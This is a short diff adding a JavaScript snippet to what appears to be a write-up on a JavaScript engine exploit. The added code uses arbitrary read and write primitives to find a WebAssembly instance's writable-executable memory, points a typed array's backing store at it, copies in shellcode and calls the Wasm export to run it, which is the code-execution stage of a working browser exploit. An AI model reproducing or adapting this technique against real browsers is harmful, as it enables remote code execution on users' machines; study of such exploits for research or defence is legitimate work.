@@ -25,3 +25,20 @@ function b2f(v) {
     return conv_f64[0];
 }
 ```
+
+```js
+const trusted_data = ArbRead(Number(instance_addr + 8n)) >> 32n;  
+const rwx_region = ArbRead(Number(trusted_data) + 48);  
+  
+console.log(rwx_region.toString(16));  
+  
+var temp_buf = new ArrayBuffer(shellcode.length)  
+var shellcode_writer = new Uint8Array(temp_buf);  
+  
+ArbWrite(Number(GetAddressOf(shellcode_writer)) + 0x30, Number(BigInt(rwx_region) & BigInt(0xffffffff)), Number(BigInt(rwx_region) >> BigInt(32)));  
+
+for(let i = 0; i < shellcode.length; i++){  
+   shellcode_writer[i] = shellcode.charCodeAt(i);  
+}  
+instance.exports.trigger()
+```
